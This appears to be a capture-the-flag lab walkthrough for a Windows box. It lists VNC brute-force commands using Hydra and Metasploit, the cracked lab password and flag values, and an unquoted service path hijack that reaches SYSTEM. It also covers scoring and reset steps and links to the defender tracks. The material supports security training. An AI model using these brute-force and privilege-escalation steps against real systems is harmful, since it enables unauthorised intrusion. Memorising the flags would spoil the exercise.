# EWS — attack FAQ walkthrough

Player-facing path for the EWS Win10 box (VulnHub / HTB style). Lab address `192.168.61.20` on the campaign VLAN unless noted.

**Goal:** capture `user.txt` and `root.txt`, optionally pivot to the DC per [ews-asrep-pivot-runbook.md](../campaign/ews-asrep-pivot-runbook.md).

| Role | Address |
|---|---|
| EWS (VNC / WinRM) | `192.168.61.20:5900`, WinRM `:5985` |
| Attacker (Kali demo) | `192.168.61.50` |

---

## Phase 1 — Recon

From Kali or your attack host on `vmbr1`:

```bash
nmap -Pn -p 5900,22 192.168.61.20
nmap -Pn -p 5900 --script vnc-info 192.168.61.20
```

Expect UltraVNC on TCP/5900. Some lab boots may land on a DHCP address
before the static network role runs; rediscover the host before assuming
`.20`.

---

## Phase 2 — VNC foothold

Brute weak/default VNC credentials with the in-tree wordlist:

```bash
# -t 1 keeps the RFB handshake paced enough for UltraVNC.
hydra -t 1 -V -f -P provisioning/wordlists/vnc-betterdefaultpasslist.txt \
  -s 5900 192.168.61.20 vnc
```

Expected success: password `FELDTECH_VNC` → desktop session as `patrick`.

Metasploit is the more reliable sweep tool when Hydra has trouble with
UltraVNC security-type negotiation:

```bash
nix develop .#kali -c msfconsole -q -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS 192.168.61.20; set RPORT 5900; set PASS_FILE provisioning/wordlists/vnc-betterdefaultpasslist.txt; set STOP_ON_SUCCESS true; set BRUTEFORCE_SPEED 0; set VERBOSE false; run; exit"
```

Connect with any VNC client, or:

```bash
vncviewer 192.168.61.20:5900
```

**User flag:** `C:\Users\patrick\Desktop\flag.txt` (`crit-low-priv-patrick`).

---

## Phase 3 — Privilege escalation (unquoted service path)

On-box (via VNC shell or WinRM once you have creds):

1. Enumerate services with unquoted paths and writable directories:

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "SecretCon"
```

2. Service `SecretConEwsSync` runs `C:\Program Files\SecretCon\EWS Sync\ews_sync.exe` — the space before `Sync` makes `C:\Program Files\SecretCon\EWS.exe` a valid hijack target when the parent folder is writable.

3. Place a payload at `C:\Program Files\SecretCon\EWS.exe` and restart the service (or reboot) to obtain **LocalSystem**.

**Root flag:** `C:\Users\Administrator\Desktop\root.txt` (`crit-root-system-privs`).

### Scoring checks

| Step | Command / action | Expected |
|---|---|---|
| User flag | `type %USERPROFILE%\Desktop\flag.txt` | `crit-low-priv-patrick` |
| Service enum | `sc qc SecretConEwsSync` | Unquoted `BINARY_PATH_NAME` with a space |
| Writable parent | `icacls "C:\Program Files\SecretCon"` | `BUILTIN\Users:(M)` |
| Exploit | Copy an executable to `C:\Program Files\SecretCon\EWS.exe`, then restart `SecretConEwsSync` or reboot | payload runs as `nt authority\system` |
| Root flag | `type C:\Users\Administrator\Desktop\root.txt` from SYSTEM context | `crit-root-system-privs` |

Dropping `EWS.exe` mutates the VM. During competition, the in-guest
`SecretCon-EWS-Reset` scheduled task runs as SYSTEM every 30 minutes by
default. It removes the hijack payload, restarts `SecretConEwsSync`,
restarts UltraVNC, and reseeds Patrick's flag. Operators can force the
same reset immediately:

```bash
(cd ansible && ansible-playbook playbooks/ews.yml -l ews-prod --tags ews_lpe_reset)
```

Operators can run the destructive validation chain and reset in one pass:

```bash
./scripts/validate/validate-ews-lpe-chain.sh --target 192.168.61.20
```

---

## Optional analyst side paths (same credential, no flag move)

These recover `FELDTECH_VNC` without repeating the brute-force step:

| Track | Procedure |
|---|---|
| PCAP | [`targets/ews-vnc-pcap-forensics/`](../../targets/ews-vnc-pcap-forensics/README.md), GitHub Release asset workflow in [`ews-vnc-pcap-release.md`](../runbooks/ews-vnc-pcap-release.md), or Arkime on `crit-capture` |
| SIEM | Wazuh rule `100806` hex blob → `scripts/observability/vnc-cred-tool.py decode` |
| NSM | Suricata/Wazuh rules `100810`–`100816` — see [defend-faq-walkthrough.md](defend-faq-walkthrough.md) |

Operator tooling: [ews-vnc-adversary-emulation.md](../runbooks/ews-vnc-adversary-emulation.md), [opnsense-vnc-brute-analyst-challenge.md](../runbooks/opnsense-vnc-brute-analyst-challenge.md).

---

## Campaign pivot (optional)

With `patrick` / recovered creds and network reachability to the DC:

```bash
./scripts/observability/ews-asrep-pivot.sh
```

Walkthrough: [ews-asrep-pivot-runbook.md](../campaign/ews-asrep-pivot-runbook.md).

---

## Validation references

| Check | Command |
|---|---|
| Post-build smoke | `./scripts/verify-ews.sh 192.168.61.20` |
| Public attack acceptance | `./scripts/validate/validate-vnc-public-attack.sh` |
| Full NSM pipeline | `./scripts/validate/validate-opnsense-vnc-pipeline.sh` |

Internal kill-chain notes: [targets/ews-win11/flag-notes.md](../../targets/ews-win11/flag-notes.md).
